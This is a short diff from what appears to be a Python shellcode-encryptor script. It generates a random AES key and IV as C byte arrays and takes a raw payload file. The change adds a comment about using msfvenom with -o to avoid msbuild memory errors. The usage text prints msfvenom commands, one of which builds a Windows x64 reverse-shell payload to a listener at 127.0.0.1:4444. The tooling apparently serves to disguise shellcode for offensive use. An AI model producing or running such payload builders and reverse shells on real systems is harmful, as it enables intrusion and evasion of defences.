@@ -11,7 +11,7 @@ key = '{' + ','.join('0x{:02x}'.format(x) for x in rawkey) + '}'
 rawiv = bytearray(os.urandom(16))
 iv = '{' + ','.join('0x{:02x}'.format(x) for x in rawiv) + '}' 
 
-
+#if you are getting memory errors at compilation/runtime with msbuild try msfvenom with -o instead of >
 if len(sys.argv) < 2:
 	print("Usage: script.py payload.bin")
 	print("Example payloads:\n    msfvenom -p windows/x64/exec CMD=calc.exe -f raw -o calc.bin\n    msfvenom -p windows/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f raw > shell.bin")
